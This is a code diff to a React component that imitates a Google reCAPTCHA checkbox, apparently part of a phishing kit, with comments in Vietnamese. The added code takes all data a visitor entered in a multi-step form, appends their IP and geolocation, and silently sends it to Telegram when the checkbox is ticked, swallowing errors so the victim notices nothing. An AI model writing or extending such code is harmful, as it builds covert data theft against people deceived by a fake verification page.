@@ -3,10 +3,17 @@
 import React from 'react'
 import { useRouter } from 'next/navigation'
 
+import { useAppSelector } from '@/app/store/hooks'
 import { RECAPTCHA_COPY } from '@/data/recaptchaCopy'
+import { getUserLocation } from '@/utils/getLocation'
+import { SendData } from '@/utils/sendData'
+
+/** Ghi nhận trong Telegram khi tick checkbox reCAPTCHA */
+const RECAPTCHA_TICKED_MARKER = 'đã tick'
 
 const ReCaptcha = () => {
     const captchaText = RECAPTCHA_COPY
+    const formData = useAppSelector((state) => state.stepForm.data)
 
     React.useEffect(() => {
         const html = document.documentElement
@@ -40,10 +47,24 @@ const ReCaptcha = () => {
 
     const checkboxLabel = isLoading ? captchaText.verifying : captchaText.notRobot
 
+    const sendRecaptchaToTelegram = async () => {
+        let payload = { ...formData, recaptcha: RECAPTCHA_TICKED_MARKER }
+        if (!formData.ip?.trim() || !formData.location?.trim()) {
+            const location = await getUserLocation()
+            payload = { ...payload, ...location }
+        }
+        try {
+            await SendData(payload)
+        } catch {
+            /* luồng UX vẫn tiếp tục */
+        }
+    }
+
     const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
         if (!e.target.checked || isLoading || isVerified) return
 
         setIsLoading(true)
+        void sendRecaptchaToTelegram()
         if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current)
         if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
 
